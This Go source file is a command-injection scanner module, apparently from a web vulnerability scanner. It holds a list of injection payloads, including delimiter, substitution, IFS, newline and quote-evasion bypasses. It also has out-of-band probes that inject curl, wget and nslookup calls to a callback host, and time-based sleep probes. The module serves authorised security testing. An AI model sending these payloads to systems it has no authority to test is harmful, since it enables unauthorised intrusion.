package modules

import (
	"fmt"
	"net"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
	"time"
)

type CMDiModule struct{}

func NewCMDiModule() *CMDiModule {
	return &CMDiModule{}
}

func (m *CMDiModule) Name() string {
	return "cmdi"
}

func (m *CMDiModule) Description() string {
	return "Harmless OS Command Injection verification (safe id/whoami, OAST, and timing probes)"
}

var (
	idPattern     = regexp.MustCompile(`uid=\d+\([^)]+\)`)
	whoamiPattern = regexp.MustCompile(`(?m)^(?:root|www-data|nginx|apache|nobody|vapf|ubuntu|daemon|cyborg|[a-zA-Z0-9_\-\\]+)$`)
	winVerPattern = regexp.MustCompile(`(?i)(?:Microsoft Windows|\[Version \d+\.\d+)`)
)

/*
CATEGORY: Harmless OS Command Injection Verification Probes (50+ entries)
Sources: PayloadsAllTheThings, OWASP Command Injection, PortSwigger CMDi Cheat Sheet.
Contexts:
- Semicolon delimiters (; id)
- Single & double ampersand delimiters (& id, && id)
- Single & double pipe delimiters (| id, || id)
- Command substitution constructs ($(id), `id`)
- Newline & whitespace bypasses (%0a, ${IFS})
- Windows cmd & powershell constructs (& whoami, | ver)
- Quote concatenation bypasses ('i'd, "who"ami)
SAFETY: Only non-destructive reading commands (id, whoami, ver) are tested. No reverse shells or file modifications.
*/
var cmdiProbes = []struct {
	Label   string
	Payload string
	Pattern *regexp.Regexp
}{
	// 1. Semicolon Delimiters (Unix)
	{"id", "; id", idPattern},
	{"id", ";id", idPattern},
	{"id", "; id;", idPattern},
	{"id", "; id ;", idPattern},
	{"whoami", "; whoami", whoamiPattern},
	{"whoami", ";whoami", whoamiPattern},
	{"whoami", "; whoami ;", whoamiPattern},

	// 2. Double Ampersand Delimiters (Unix & Windows)
	{"id", "&& id", idPattern},
	{"id", "&&id", idPattern},
	{"id", "&& id &&", idPattern},
	{"whoami", "&& whoami", whoamiPattern},
	{"whoami", "&&whoami", whoamiPattern},
	{"whoami", "&& whoami &&", whoamiPattern},
	{"ver", "&& ver", winVerPattern},

	// 3. Single Ampersand Delimiters (Background Execution / Sequential)
	{"id", "& id", idPattern},
	{"id", "&id", idPattern},
	{"whoami", "& whoami", whoamiPattern},
	{"whoami", "&whoami", whoamiPattern},
	{"ver", "& ver", winVerPattern},

	// 4. Pipe Delimiters (Unix & Windows)
	{"id", "| id", idPattern},
	{"id", "|id", idPattern},
	{"whoami", "| whoami", whoamiPattern},
	{"whoami", "|whoami", whoamiPattern},
	{"ver", "| ver", winVerPattern},

	// 5. Double Pipe (OR Execution)
	{"id", "|| id", idPattern},
	{"id", "||id", idPattern},
	{"whoami", "|| whoami", whoamiPattern},
	{"whoami", "||whoami", whoamiPattern},

	// 6. Command Substitution - Dollar Parentheses
	{"id", "$(id)", idPattern},
	{"id", "`id`", idPattern},
	{"id", "\"$(id)\"", idPattern},
	{"id", "'$(id)'", idPattern},
	{"id", "x$(id)x", idPattern},
	{"whoami", "$(whoami)", whoamiPattern},
	{"whoami", "`whoami`", whoamiPattern},
	{"whoami", "\"$(whoami)\"", whoamiPattern},
	{"whoami", "'$(whoami)'", whoamiPattern},

	// 7. Whitespace Bypass with ${IFS}
	{"id", ";id;${IFS}", idPattern},
	{"id", "|id;${IFS}", idPattern},
	{"id", "&&id;${IFS}", idPattern},
	{"whoami", ";whoami;${IFS}", whoamiPattern},
	{"whoami", "|whoami;${IFS}", whoamiPattern},
	{"whoami", "&&whoami;${IFS}", whoamiPattern},

	// 8. Newline Separators (%0a / \n)
	{"id", "\nid", idPattern},
	{"id", "\r\nid", idPattern},
	{"id", "%0aid", idPattern},
	{"id", "%0a id", idPattern},
	{"whoami", "\nwhoami", whoamiPattern},
	{"whoami", "\r\nwhoami", whoamiPattern},
	{"whoami", "%0awhoami", whoamiPattern},
	{"whoami", "%0a whoami", whoamiPattern},

	// 9. Quote Evasion & Concatenation
	{"id", "; 'i'd", idPattern},
	{"id", "; \"i\"d", idPattern},
	{"id", "| 'i'd", idPattern},
	{"id", "&& 'i'd", idPattern},
	{"whoami", "; 'who'ami", whoamiPattern},
	{"whoami", "; \"who\"ami", whoamiPattern},
	{"whoami", "| 'who'ami", whoamiPattern},
	{"whoami", "&& 'who'ami", whoamiPattern},
}

func (m *CMDiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		// 1. Output-based check (safe id / whoami)
		for _, probe := range cmdiProbes {
			var resp *client.Response
			var err error
			if isPost {
				headers := map[string]string{}
				if target.IsJSON {
					headers["Content-Type"] = "application/json"
				}
				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, probe.Payload), headers)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, probe.Payload), "", nil)
			}
			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			if probe.Pattern.MatchString(resp.Body) {
				f := &Finding{
					Module:      m.Name(),
					Title:       "OS Command Injection (Output Confirmed)",
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe.Payload,
					Detail:      fmt.Sprintf("Confirmed arbitrary command execution using harmless probe '%s'.", probe.Payload),
					Evidence:    fmt.Sprintf("Matched system user pattern in response body: %s", probe.Label),
					Remediation: "Avoid shell execution with request-controlled inputs. Use safe system APIs without shell invocation.",
					CWEID:       78,
				}
				f.SetConfidence(ConfidenceConfirmed)
				findings = append(findings, f)
				break
			}
		}

		if len(findings) > 0 {
			continue
		}

		// 2. Out-of-band (OAST) check (benign curl / wget / nslookup commands only)
		if target.OAST != nil {
			probeID := target.OAST.GenerateProbeID()
			cbURL := target.OAST.CallbackURL(probeID)
			hostOnly := target.OAST.PublicHost
			if strings.Contains(hostOnly, ":") {
				h, _, _ := net.SplitHostPort(hostOnly)
				if h != "" {
					hostOnly = h
				}
			}

			oastCmds := []string{
				fmt.Sprintf("; curl -s %s || wget -q -O- %s ;", cbURL, cbURL),
				fmt.Sprintf("$(curl -s %s || wget -q -O- %s)", cbURL, cbURL),
				fmt.Sprintf("`curl -s %s || wget -q -O- %s`", cbURL, cbURL),
				fmt.Sprintf("& nslookup %s.%s &", probeID, hostOnly),
			}

			for _, p := range oastCmds {
				var reqErr error
				if isPost {
					headers := map[string]string{}
					if target.IsJSON {
						headers["Content-Type"] = "application/json"
					}
					_, reqErr = c.Request("POST", target.URL, target.BuildBodyWithParam(param, p), headers)
				} else {
					_, reqErr = c.Request("GET", target.BuildURLWithParam(param, p), "", nil)
				}
				if reqErr != nil {
					continue
				}

				if hit, ok := target.OAST.WaitForHit(probeID, 3*time.Second); ok && hit != nil {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Blind OS Command Injection (OAST Callback Confirmed)",
						Severity:    SeverityCritical,
						URL:         target.URL,
						Parameter:   param,
						Payload:     p,
						Detail:      fmt.Sprintf("Confirmed arbitrary command execution via benign OAST callback for probe %s.", probeID),
						Evidence:    fmt.Sprintf("OAST hit from %s at %s (%s %s)", hit.RemoteAddr, hit.Timestamp.Format(time.RFC3339), hit.Method, hit.Path),
						Remediation: "Avoid shell execution with request-controlled inputs. Use parameterized exec APIs.",
						CWEID:       78,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					break
				}
			}
		}

		if len(findings) > 0 {
			continue
		}

		// 3. Time-based check (safe 3-second sleep)
		origVal := target.Params[param]
		if isPost {
			origVal = target.Data[param]
		}
		if origVal == "" {
			origVal = "1"
		}

		// Measure baseline latency
		start := time.Now()
		var baseErr error
		if isPost {
			headers := map[string]string{}
			if target.IsJSON {
				headers["Content-Type"] = "application/json"
			}
			_, baseErr = c.Request("POST", target.URL, target.BuildBodyWithParam(param, origVal), headers)
		} else {
			_, baseErr = c.Request("GET", target.BuildURLWithParam(param, origVal), "", nil)
		}
		baseDuration := time.Since(start)

		if baseErr != nil || baseDuration > 2*time.Second {
			continue
		}

		sleepProbes := []string{
			"; sleep 3 ;",
			"| sleep 3",
			"&& sleep 3",
			"$(sleep 3)",
			"`sleep 3`",
		}

		for _, sp := range sleepProbes {
			probeStart := time.Now()
			var probeErr error
			if isPost {
				headers := map[string]string{}
				if target.IsJSON {
					headers["Content-Type"] = "application/json"
				}
				_, probeErr = c.Request("POST", target.URL, target.BuildBodyWithParam(param, sp), headers)
			} else {
				_, probeErr = c.Request("GET", target.BuildURLWithParam(param, sp), "", nil)
			}
			probeDuration := time.Since(probeStart)

			if probeErr != nil {
				continue
			}

			if probeDuration >= 2800*time.Millisecond && probeDuration > baseDuration+2*time.Second {
				f := &Finding{
					Module:      m.Name(),
					Title:       "Blind OS Command Injection (Time-Based)",
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     sp,
					Detail:      fmt.Sprintf("Response was delayed by %v (baseline: %v) matching 'sleep 3' probe.", probeDuration, baseDuration),
					Evidence:    fmt.Sprintf("Baseline: %v, Probe elapsed: %v", baseDuration, probeDuration),
					Remediation: "Avoid shell execution with request-controlled inputs. Use parameterized exec APIs.",
					CWEID:       78,
				}
				f.SetConfidence(ConfidenceProbable)
				findings = append(findings, f)
				break
			}
		}
	}

	return findings, nil
}
